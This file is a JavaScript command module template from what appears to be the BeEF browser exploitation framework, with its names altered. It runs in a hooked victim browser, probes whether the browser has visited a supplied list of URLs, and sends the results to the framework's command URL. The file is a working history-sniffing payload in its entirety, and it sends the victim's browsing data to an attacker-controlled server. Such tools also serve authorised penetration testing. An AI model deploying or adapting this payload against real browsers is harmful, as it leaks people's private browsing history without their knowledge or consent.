//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {
	var results = server.browser.hasVisited("<%== format_multiline(@urls) %>");
	var comp = '';
	for (var i=0; i < results.length; i++)
	{
		comp += results[i].url+' = '+results[i].visited+'  ';
	}
	server.net.send("<%= @command_url %>", <%= @command_id %>, comp);
});

